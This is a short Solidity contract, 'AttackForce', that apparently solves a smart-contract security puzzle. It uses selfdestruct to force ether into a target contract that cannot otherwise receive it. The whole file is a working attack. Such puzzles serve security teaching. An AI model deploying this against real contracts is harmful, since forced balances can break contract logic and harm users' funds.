// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce  {
    address payable public victim;

    constructor(address payable _force) payable {
        victim = _force;
    }

    function attack() external payable {
        selfdestruct(victim);
    }
}